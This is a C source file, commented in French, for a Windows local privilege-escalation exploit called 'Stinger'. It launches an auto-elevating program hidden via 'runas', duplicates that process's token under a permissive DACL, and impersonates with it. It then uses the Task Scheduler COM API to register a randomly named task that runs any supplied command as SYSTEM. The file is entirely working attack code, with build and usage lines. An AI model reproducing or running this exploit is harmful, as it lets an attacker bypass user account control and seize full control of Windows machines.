/*
 * Filename: stinger_simple.c
 *
 * Description:
 * Version minimale de l'exploit "Stinger" en pur C.
 * Cet exploit récupère un token depuis un processus autoélevé, le duplique, ajuste son niveau
 * d'intégrité et utilise COM pour créer une tâche planifiée qui exécute une commande en tant que SYSTEM.
 * 
 * gcc exploit.c -o stinger.exe -ladvapi32 -lshell32 -luser32 -lole32 -ltaskschd -luuid -loleaut32
 */


 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <wchar.h>
 #include <sddl.h>
 #include <aclapi.h>
 #include <objbase.h>
 #include <taskschd.h>
 #include <winternl.h>
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "taskschd.lib")
 
 typedef NTSTATUS (NTAPI *NtSetInformationToken_t)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG);
 
 struct ThreadParams {
     char *executable;
     char *arguments;
     HANDLE token;
 };
 
 DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam);
 void ManipulateTokenIntegrity(HANDLE hToken);
 void generateRandomString(char *buffer, size_t size);
 BSTR CharToBSTR(const char *str);
 
 // Convertit une chaîne char (UTF-8) en BSTR
 BSTR CharToBSTR(const char *str) {
     if (!str) return NULL;
     int wchars_num = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
     BSTR bstr = SysAllocStringLen(NULL, wchars_num - 1);
     if(bstr)
         MultiByteToWideChar(CP_UTF8, 0, str, -1, bstr, wchars_num);
     return bstr;
 }
 
 // Génère une chaîne aléatoire de 8 caractères (terminée par '\0')
 void generateRandomString(char *buffer, size_t size) {
     const char *chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     int len = (size < 9) ? size - 1 : 8;
     for (int i = 0; i < len; i++)
         buffer[i] = chars[rand() % (int)strlen(chars)];
     buffer[len] = '\0';
 }
 
 // Abaisse le niveau d'intégrité du token à "medium"
 void ManipulateTokenIntegrity(HANDLE hToken) {
     HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtDll) return;
     NtSetInformationToken_t NtSetInformationToken = (NtSetInformationToken_t)GetProcAddress(hNtDll, "NtSetInformationToken");
     if (!NtSetInformationToken) return;
     SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
     PSID pSID;
     if (!AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_MEDIUM_RID, 0,0,0,0,0,0,0, &pSID))
         return;
     TOKEN_MANDATORY_LABEL tml = {0};
     tml.Label.Attributes = SE_GROUP_INTEGRITY;
     tml.Label.Sid = pSID;
     NtSetInformationToken(hToken, TokenIntegrityLevel, &tml, sizeof(tml));
     FreeSid(pSID);
 }
 
 // Fonction exécutée dans un thread pour réaliser les opérations privilégiées via COM
 DWORD WINAPI TestPrivilegedOperations(LPVOID lpParam) {
     struct ThreadParams *tp = (struct ThreadParams *)lpParam;
     char *executable = tp->executable;
     char *arguments = tp->arguments;
     HANDLE token = tp->token;
     char taskName[9];
     generateRandomString(taskName, sizeof(taskName));
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) return 1;
     if (!ImpersonateLoggedOnUser(token)) {
         CoUninitialize();
         return 1;
     }
     ITaskService *pService = NULL;
     hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                             &IID_ITaskService, (void **)&pService);
     if (FAILED(hr)) {
         CoUninitialize();
         return 1;
     }
     VARIANT varEmpty;
     VariantInit(&varEmpty);
     varEmpty.vt = VT_EMPTY;
     hr = pService->lpVtbl->Connect(pService, varEmpty, varEmpty, varEmpty, varEmpty);
     if (FAILED(hr)) {
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     ITaskFolder *pRootFolder = NULL;
     BSTR bstrRoot = SysAllocString(L"\\");
     hr = pService->lpVtbl->GetFolder(pService, bstrRoot, &pRootFolder);
     SysFreeString(bstrRoot);
     if (FAILED(hr)) {
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     ITaskDefinition *pTask = NULL;
     hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
     if (FAILED(hr)) {
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     IRegistrationInfo *pRegInfo = NULL;
     hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
     if (SUCCEEDED(hr)) {
         BSTR bstrAuthor = SysAllocString(L"User");
         pRegInfo->lpVtbl->put_Author(pRegInfo, bstrAuthor);
         SysFreeString(bstrAuthor);
         pRegInfo->lpVtbl->Release(pRegInfo);
     }
     IPrincipal *pPrincipal = NULL;
     hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
     if (SUCCEEDED(hr)) {
         BSTR bstrId = SysAllocString(L"Principal1");
         pPrincipal->lpVtbl->put_Id(pPrincipal, bstrId);
         SysFreeString(bstrId);
         pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_SERVICE_ACCOUNT);
         pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_HIGHEST);
         pPrincipal->lpVtbl->Release(pPrincipal);
     }
     ITriggerCollection *pTriggerCollection = NULL;
     hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     ITrigger *pTrigger = NULL;
     hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_TIME, &pTrigger);
     pTriggerCollection->lpVtbl->Release(pTriggerCollection);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     ITimeTrigger *pTimeTrigger = NULL;
     hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IID_ITimeTrigger, (void **)&pTimeTrigger);
     pTrigger->lpVtbl->Release(pTrigger);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     SYSTEMTIME st;
     GetSystemTime(&st);
     st.wMinute += 1;
     wchar_t wzTime[64];
     swprintf_s(wzTime, 64, L"%04d-%02d-%02dT%02d:%02d:%02d",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
     BSTR bstrStartBoundary = SysAllocString(wzTime);
     hr = pTimeTrigger->lpVtbl->put_StartBoundary(pTimeTrigger, bstrStartBoundary);
     SysFreeString(bstrStartBoundary);
     if (FAILED(hr)) {
         pTimeTrigger->lpVtbl->Release(pTimeTrigger);
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     IActionCollection *pActionCollection = NULL;
     hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     IAction *pAction = NULL;
     hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
     pActionCollection->lpVtbl->Release(pActionCollection);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     IExecAction *pExecAction = NULL;
     hr = pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void **)&pExecAction);
     pAction->lpVtbl->Release(pAction);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     BSTR bstrExecutable = CharToBSTR(executable);
     hr = pExecAction->lpVtbl->put_Path(pExecAction, bstrExecutable);
     SysFreeString(bstrExecutable);
     if (SUCCEEDED(hr)) {
         BSTR bstrArguments = CharToBSTR(arguments);
         hr = pExecAction->lpVtbl->put_Arguments(pExecAction, bstrArguments);
         SysFreeString(bstrArguments);
     }
     if (FAILED(hr)) {
         pExecAction->lpVtbl->Release(pExecAction);
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     pExecAction->lpVtbl->Release(pExecAction);
 
     // Enregistrement de la tâche
     BSTR bstrMyTask = CharToBSTR(taskName);
     VARIANT varUser, varPassword, varSddl;
     VariantInit(&varUser);
     VariantInit(&varPassword);
     VariantInit(&varSddl);
     varUser.vt = VT_BSTR;
     varUser.bstrVal = SysAllocString(L"SYSTEM");
     varPassword.vt = VT_EMPTY;
     varSddl.vt = VT_BSTR;
     varSddl.bstrVal = SysAllocString(L"");
     IRegisteredTask *pRegisteredTask = NULL;
     hr = pRootFolder->lpVtbl->RegisterTaskDefinition(
            pRootFolder, 
            bstrMyTask, 
            pTask, 
            TASK_CREATE_OR_UPDATE,
            varUser, varPassword,
            TASK_LOGON_SERVICE_ACCOUNT, 
            varSddl, 
            &pRegisteredTask);
     SysFreeString(bstrMyTask);
     VariantClear(&varUser);
     VariantClear(&varPassword);
     VariantClear(&varSddl);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     // Exécution de la tâche
     IRunningTask *pRunningTask = NULL;
     hr = pRegisteredTask->lpVtbl->Run(pRegisteredTask, varEmpty, &pRunningTask);
     pRegisteredTask->lpVtbl->Release(pRegisteredTask);
     if (FAILED(hr)) {
         pTask->lpVtbl->Release(pTask);
         pRootFolder->lpVtbl->Release(pRootFolder);
         pService->lpVtbl->Release(pService);
         CoUninitialize();
         return 1;
     }
     if (pRunningTask)
         pRunningTask->lpVtbl->Release(pRunningTask);
     pTask->lpVtbl->Release(pTask);
     pRootFolder->lpVtbl->Release(pRootFolder);
     pService->lpVtbl->Release(pService);
     CoUninitialize();
     RevertToSelf();
     return 0;
 }
 
 int main(int argc, char* argv[]) {
     if (argc < 3) {
         printf("Usage: %s <autoelevate.exe> <command.exe> [args...]\n", argv[0]);
         return 1;
     }
     size_t size = strlen(argv[1]) + 1;
     wchar_t* wAutoElevate = (wchar_t*)malloc(size * sizeof(wchar_t));
     size_t outSize;
     mbstowcs_s(&outSize, wAutoElevate, size, argv[1], size - 1);
     char *executable = argv[2];
     char arguments[1024] = {0};
     for (int i = 3; i < argc; ++i) {
         strcat(arguments, argv[i]);
         if (i < argc - 1)
             strcat(arguments, " ");
     }
     SHELLEXECUTEINFOW shExInfo;
     ZeroMemory(&shExInfo, sizeof(shExInfo));
     shExInfo.cbSize = sizeof(shExInfo);
     shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
     shExInfo.lpVerb = L"runas";
     shExInfo.lpFile = wAutoElevate;
     shExInfo.lpParameters = L"";
     shExInfo.nShow = SW_HIDE;
     if (ShellExecuteExW(&shExInfo)) {
         HANDLE hToken;
         if (OpenProcessToken(shExInfo.hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
             HANDLE hDupToken;
             SECURITY_ATTRIBUTES sa;
             LPCWSTR sddl = L"D:P(A;;GA;;;WD)";
             sa.nLength = sizeof(sa);
             sa.bInheritHandle = FALSE;
             if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL)) {
                 CloseHandle(hToken);
                 free(wAutoElevate);
                 return -1;
             }
             if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDupToken)) {
                 struct ThreadParams tp;
                 tp.token = hDupToken;
                 tp.executable = executable;
                 tp.arguments = arguments;
                 DWORD threadId;
                 HANDLE hThread = CreateThread(NULL, 0, TestPrivilegedOperations, &tp, 0, &threadId);
                 if (hThread != NULL) {
                     WaitForSingleObject(hThread, INFINITE);
                     CloseHandle(hThread);
                     CloseHandle(hDupToken);
                     CloseHandle(hToken);
                 }
             } else {
                 CloseHandle(hToken);
             }
         }
         TerminateProcess(shExInfo.hProcess, 0);
         CloseHandle(shExInfo.hProcess);
     }
     free(wAutoElevate);
     return 0;
 }
 
